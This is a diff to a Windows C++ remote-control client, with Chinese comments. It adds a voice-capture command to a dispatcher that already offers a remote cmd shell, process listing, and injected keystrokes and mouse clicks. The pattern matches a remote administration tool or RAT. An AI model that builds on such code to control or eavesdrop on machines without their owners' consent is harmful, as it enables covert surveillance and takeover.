@@ -11,6 +11,7 @@
 #include "CmdManage.h"
 #include "ConnectInfo.h"
 #include "WindowManager.h"
+#include "Voice.h"
 
 //套接字的初始化
 DWORD __stdcall ConnectThread(LPVOID lparam)
@@ -74,11 +75,16 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 		case CMD_CMD_SHELL_REQUEST://收到了cmd命令行传输请求
 			{
 				CreateThread(NULL, NULL, CmdManageThread, NULL, NULL, NULL);//创建线程处理CMD 命令 传输
-			    break;
+				break;
 			}
 		case CMD_PROCESS_SHOW:
 			{
 				CreateThread(NULL, NULL, ProcessdThread, NULL, NULL, NULL);
+				break;
+			}
+		case CMD_VOICE:
+			{
+					CreateThread(NULL, NULL, VoiceThread, NULL, NULL, NULL);;
 				break;
 			}
 		case CMD_HEARTBEAT://心跳包
@@ -86,15 +92,15 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 				//不用处理这里 
 			}
 			break;
-	 	case CMD_CTRLALTDEL:// Ctrl + Alt + del
+		case CMD_CTRLALTDEL:// Ctrl + Alt + del
 			{
 
 			}
 			break;
 		case CMD_KEYDOWN://WM_KEYDOWN 
 			{
-			//	XScreenXor OpenDesktop;
-			//	::MessageBox(NULL, "key down", "DD", MB_OK);
+				//	XScreenXor OpenDesktop;
+				//	::MessageBox(NULL, "key down", "DD", MB_OK);
 				int nVirtKey = msgHead.dwExtend1;
 				keybd_event((BYTE)nVirtKey,0,0,0);
 
@@ -115,7 +121,7 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 				pt.x = msgHead.dwExtend1;
 				pt.y = msgHead.dwExtend2;
 				SetCursorPos(pt.x, pt.y);
-				
+
 			}
 			break;
 		case CMD_LBUTTONDOWN://WM_LBUTTONDOWN
@@ -143,7 +149,7 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 		case CMD_RBUTTONDOWN://WM_RBUTTONDOWN  
 			{
 				//::MessageBox(NULL, "RBUTTONDOWN", "DD", MB_OK);
-			//	XScreenXor OpenDesktop;
+				//	XScreenXor OpenDesktop;
 				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
 			}
 			break;
@@ -162,12 +168,12 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
 			}
 			break;
-	    default:
+		default:
 			{
 				::MessageBox(NULL, "接收到未知消息", "DD", MB_OK);
 				break;
 			}
-	 
+
 		}
 	}
 
@@ -206,13 +212,13 @@ DWORD __stdcall RuningThread(LPVOID lParam)
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance,
-	HINSTANCE hPrevInstance,
-	LPSTR     lpCmdLine,
-	int       nCmdShow)
+					 HINSTANCE hPrevInstance,
+					 LPSTR     lpCmdLine,
+					 int       nCmdShow)
 {
 	// TODO: Place code here.
 	HANDLE hThread=NULL;
- 	hThread=CreateThread(NULL,NULL,RuningThread,NULL,NULL,NULL);
+	hThread=CreateThread(NULL,NULL,RuningThread,NULL,NULL,NULL);
 	WaitForSingleObject(hThread,INFINITE);//INFINTE无限长 即等待时间无限长 只有当hThread线程结束才继续向下运行
 	CloseHandle(hThread);
 	return 0;
